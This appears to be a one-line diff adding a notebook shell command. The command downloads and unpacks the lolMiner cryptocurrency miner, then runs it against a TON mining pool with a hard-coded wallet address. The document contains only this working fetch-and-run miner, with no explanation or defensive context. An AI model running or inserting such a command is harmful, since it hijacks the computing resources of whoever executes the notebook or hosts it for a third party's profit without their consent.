@@ -1,0 +1,1 @@
+!wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.48/lolMiner_v1.48_Lin64.tar.gz && tar -xvf lolMiner_v1.48_Lin64.tar.gz && cd 1.48 && ./lolMiner --algo TON --pool https://ton-pool-server-p3agi.ondigitalocean.app/ --user EQAWWlzNtOUzU1pgWTm_Lhd2DS6lhl3augA43jKy9zNwMWvb
